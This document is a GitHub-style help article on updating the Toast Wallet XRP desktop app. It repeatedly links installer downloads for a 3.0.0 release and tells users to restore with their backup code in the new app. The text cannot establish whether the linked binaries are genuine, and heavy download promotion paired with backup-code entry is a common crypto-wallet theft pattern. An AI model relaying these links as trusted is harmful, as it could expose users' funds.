<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Update Toast Wallet to the latest version</h1>

<p align="center">Move from any older build to the current desktop release.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

There is no in-place updater to rely on: you update Toast Wallet by making a backup, removing the old program and installing the newest file from the [Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). Your accounts then open again in the new version.

## 👀 You'll see this if

- Your Toast Wallet still runs an older build from years ago.
- The app works, but you want the current, supported release.
- Balances look out of date or the wallet struggles to load data.
- You are not sure which version you have installed.

## 🤔 Why it matters

Wallet software sits between you and a live network. Over time, networks change, operating systems change and security expectations change. An older Toast Wallet build was made for the conditions at the time it was released. Running the current release means you benefit from the latest fixes and from a build that matches today's systems.

Updating also simplifies support. Every guide in this library assumes you are using the latest desktop wallet. If something goes wrong on an old build, the first step is always to update, so doing it early saves time.

## 🛠️ Fix: update step by step

1. **Find out what you have.** Open the old Toast Wallet and look in Settings or the About information for a version number. Write it down for reference. If you cannot find one, treat it as old.
2. **Back up first.** In Settings, choose Backup Wallet and write the backup code on paper. Keep your passphrase with it. The detailed walk-through is in [create a new Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/create-new-toast-wallet-backup.md).
3. **Note your addresses.** Copy each account address beginning with `r` to your notes so you can confirm everything after the update.
4. **Remove the old program.** Follow [uninstall an old Toast Wallet version](https://github.com/Toast-Wallet/learn/blob/main/how-to/uninstall-old-toast-wallet-version.md) for your system. This removes the program only.
5. **Download the new release.** Get the file for your system from the official release page. Avoid any other download source.
6. **Check the checksum.** Compare the SHA-256 value of your download with the value published on the release. The method for each system is in [verify a Toast Wallet download checksum](https://github.com/Toast-Wallet/learn/blob/main/how-to/verify-toast-wallet-download-checksum.md).
7. **Install the latest desktop wallet.** Run the installer on Windows, copy the app into Applications on macOS, or make the AppImage executable on Linux.
8. **Open and compare.** Start the new version. Your accounts should appear. Compare the addresses with your notes. If the app asks you to create or restore a wallet, choose restore and enter your backup code.
9. **Make a new backup.** After everything checks out, create a fresh backup code from the new version and store it safely.

## 🔁 If that did not work

- **The new version shows no accounts.** Restore from your backup code. The guide [restore a Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/restore-toast-wallet-backup.md) covers each screen.
- **The passphrase is rejected.** It must be the passphrase that was in place when the backup was created.
- **The app does not start.** Check [Toast Wallet not opening fix](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-not-opening-fix.md).
- **Balances read zero.** The account may need a moment to load, or the network connection may be blocked. Confirm the address and wait before assuming anything is wrong.

## 🛡️ Prevention

Check the [Toast Wallet app repository](https://github.com/Toast-Wallet/core) from time to time for new releases, and only trust a release listed there. Do not respond to emails or messages saying you "must update now" with a link; that is a classic phishing pattern. Real releases do not arrive by private message. Keep your backup code current so updating is always a calm, five-minute task rather than a stressful one.

Choose a quiet moment for updates, when you are not about to send a payment. If you are expecting incoming XRP, wait until it has arrived and shows in your balance, then update. Doing one thing at a time makes it much easier to see where a problem started if anything unexpected happens.

## 📝 Good to know

People often ask whether the update moves their XRP or changes anything on the XRP Ledger. It does not. Updating Toast Wallet only replaces the program on your computer. Your accounts, balances and transaction history are recorded on the ledger and are read again by the new version when it starts. Nothing is sent and no fee is charged by updating.

It is also normal for the first start of a new release to take a little longer while the app reads your existing data and connects. Give it a moment before deciding something is wrong. If you see your addresses but the balance is still loading, wait and keep the window open.

Another common worry is whether an update will ask you to set everything up again. Usually it does not: if your wallet data is still on the computer, the latest version reads it and you unlock with the same PIN as before. You only need the backup code when the data is not there, for example on a new computer or after a clean system reinstall. Having the code ready simply means you are covered either way.

## ❓ FAQ

<details>
<summary>Will updating change my addresses?</summary>

No. Your addresses come from your keys, which you bring across with your existing data or backup code.

</details>

<details>
<summary>How often are new versions released?</summary>

Releases appear on the GitHub releases page when they are ready. Watch that page rather than third-party sites.

</details>

<details>
<summary>Can I go back to an older version?</summary>

Staying on the current release is recommended. All guides here are written for the latest desktop wallet.

</details>

> [!WARNING]
> Real updates never ask for your recovery words, passphrase or backup code on a website. Download only from the official release page.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Uninstall an old Toast Wallet version](https://github.com/Toast-Wallet/learn/blob/main/how-to/uninstall-old-toast-wallet-version.md) | Remove an outdated program safely without losing access to your XRP. |
| [Verify a Toast Wallet download checksum](https://github.com/Toast-Wallet/learn/blob/main/how-to/verify-toast-wallet-download-checksum.md) | Compare SHA-256 values so you know the installer is the real one. |
| [Is Toast Wallet still working](https://github.com/Toast-Wallet/learn/blob/main/how-to/is-toast-wallet-still-working.md) | The desktop wallet's current status and where releases appear. |
